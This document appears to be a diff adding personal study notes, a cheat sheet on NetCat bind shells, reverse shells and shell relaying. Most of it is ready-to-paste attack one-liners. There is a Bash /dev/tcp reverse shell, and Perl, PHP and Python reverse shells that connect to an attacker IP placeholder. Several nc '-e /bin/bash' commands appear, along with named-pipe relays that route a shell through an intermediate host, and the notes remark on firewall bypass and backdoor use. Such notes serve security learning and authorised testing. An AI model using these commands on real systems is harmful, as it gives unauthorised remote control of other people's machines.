@@ -1,0 +1,158 @@
+
+NetCat Implementations:
+
+				1.	Binding shell
+				2.	Reverse shell
+					2.1	By using NetCat
+					2.2	Bash
+					2.3	Perl
+					2.4	PHP
+					2.5 Python
+				
+				3.	Relay
+					3.1.	Server-to-Client Relay
+					3.2.	Client-to-Server Relay
+					3.3.	Server-to-Server Relay
+					3.4.	Client-to-Client Relay
+				
+		-	In all above methods, we execute the shell from Target machine
+		
+		-	During NetCat session,	All 'stdin' {Keyboard} & 'stdout' {Screen} are controlled by Attacker-machine
+		
+		-	Always start the server first then listener
+	
+	1.	Binding shell:
+	
+			-	Binding the shell to a specific port { Running server/ Listening to incomming connection "on specific port" } in Target machine
+			-	Attacker machine = NetCat-Client
+			-	Where is it used most?
+				-	Malicious software implements 'Binding shell' as 'Back-door"
+					-	The machine will be always listing for an incoming Back-door connection
+			-	One security issue:
+				-	As it NetCat-server is running on Target-machine,
+					Anyone {Other unkown attackers} can have access to Target's shell
+			-	One disadvantage:
+				-	Firewall often have strict inbound-traffic-filtering
+				
+			Eg:
+				Target	:	{Server}	:	nc -vv -l -p [Specific_Port] -e /bin/bash
+				Attacker:	{Client}	:	nc -vv [IP_Target] [Port]
+				
+	2.	Reverse shell:
+	
+			-	A shell is initiated on Target machine
+			-	Attacker-machine listens to pick-up the initiated shell
+			-	Where it is used?
+				-	More often, Target system might have implemented a firewall to block an incoming-port {where nc-server is listening}
+				
+			-	Advantanges over Binding shell:
+				-	Other unkown attackers can not have access over Target-machine.
+				-	Bypasses Firewall resistriction
+			
+			Eg:
+				Target	:	{Client}	:	nc -vv [IP_Attack] [Port] -e /bin/bash
+				Attacker:	{Server}	:	nc -vv -l -p [Port]
+				
+	2.1	Reverse shell without Netcat on Target host:	{	Attacker-machine always runs NetCat	}
+	
+		1.	Bash reverse shell:
+		
+				Target	:	{Client}	:	bash -i >& /dev/tcp/[IP_Attack]/[Port] 0>&1
+				
+		2.	Perl reverse shell:
+		
+				Target	:	{Client}	:	perl -e 'use Socket;$i="[IP_Attack]";$p=[Port];socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+				
+		3.	PHP reverse shell:
+		
+				Target	:	{Client}	:	php -r '$sock=fsockopen("[IP_Attack]",[Port]);exec("/bin/sh -i <&3 >&3 2>&3");'
+				
+		4.	Python reverse shell:
+		
+				Target	:	{Client}	:	python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[IP_Attack]",[Port]));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+				
+	3.	Relaying:
+	
+		-	When to use?
+		
+			-	No possible connection between Target-machine & Attacker-machine + But Anohter system can have access to Both Target & Attacker machines
+		
+		3.1.	Server-to-Client Relay:			{	Relayed Binding-Shell	}	{	Target = Server		}
+		
+				Connection:
+				
+						[IP_Attack]								[IP_Relay]							[IP_Target]
+						
+					Attacker-machine	->		Server-side Relay	->	Client-side Relay	->		Target-machine
+													TCP/2222										TCP/[Port]
+												
+					Attacker-machine	=>	Client
+					Target-machine		=>	Server
+					
+				Command:
+				
+					Attacker	:	{Client}		:	nc -vv [IP_Relay] 2222
+					
+					Relay		:	{Server-Client}	:	nc -vv -l -p 2222 < myPipe | nc -vv [IP_Target] [Port] > myPipe		//	Execute this command first "sudo mknod myPipe p"
+		
+					Target		:	{Server}		:	nc -vv -l -p [Port] -e /bin/bash
+					
+		3.2.	Client-to-Server Relay:			{	Relayed Reverse-Shell	}	{	Target = Client		}
+			
+				Connection:
+				
+						[IP_Attack]								[IP_Relay]							[IP_Target]
+						
+					Attacker-machine	->		Client-side Relay	->	Server-side Relay	->		Target-machine
+						TCP/2222											TCP/[Port]
+
+					Attacker-machine	=>	Server
+					Target-machine		=>	Client	
+					
+				Command:
+				
+					Attacker	:	{Server}		:	nc -vv -l -p 2222
+
+					Relay		:	{Client-Server}	:	nc -vv [IP_Attack] 2222 < myPipe | nc -vv -l -p [Port] > myPipe
+						
+					Target		:	{Client}		:	nc -vv [IP_Relay] [Port] -e /bin/bash
+					
+		3.3.	Server-to-Server Relay:
+		
+				Connection:
+				
+						[IP_Attack]								[IP_Relay]							[IP_Target]
+						
+					Attacker-machine	->		Server-side Relay	->	Server-side Relay	->		Target-machine
+												TCP/2222				TCP/[Port]
+
+					Attacker-machine	=>	Client
+					Target-machine		=>	Client
+					
+				Command:
+				
+					Attacker	:	{Clinet}		:	nc -vv [IP_Relay] 2222
+					
+					Relay		:	{Server-Server}	:	nc -vv -l -p 2222 < myPipe | nc -vv -l -p [Port] > myPipe
+					
+					Target		:	{Client}		:	nc -vv [IP_Relay] [Port] -e /bin/bash
+					
+		3.4		Clinet-to-Client Relay:
+		
+				Connection:
+				
+						[IP_Attack]								[IP_Relay]							[IP_Target]
+						
+					Attacker-machine	->		Client-side Relay	->	Clinet-side Relay	->		Target-machine
+					TCP/2222																		TCP/[Port]
+
+					Attacker-machine	=>	Server
+					Target-machine		=>	Server
+					
+				Command:
+				
+					Attacker	:	{Sever}			:	nc -vv -l -p 2222
+					
+					Relay		:	{Client-Client}	:	nc -vv [IP_Attack] 2222 < myPipe | nc -vv [IP_Target] [Port] > myPipe
+					
+					Target		:	{Server}		:	nc -vv -l -p [Port] -e /bin/bash
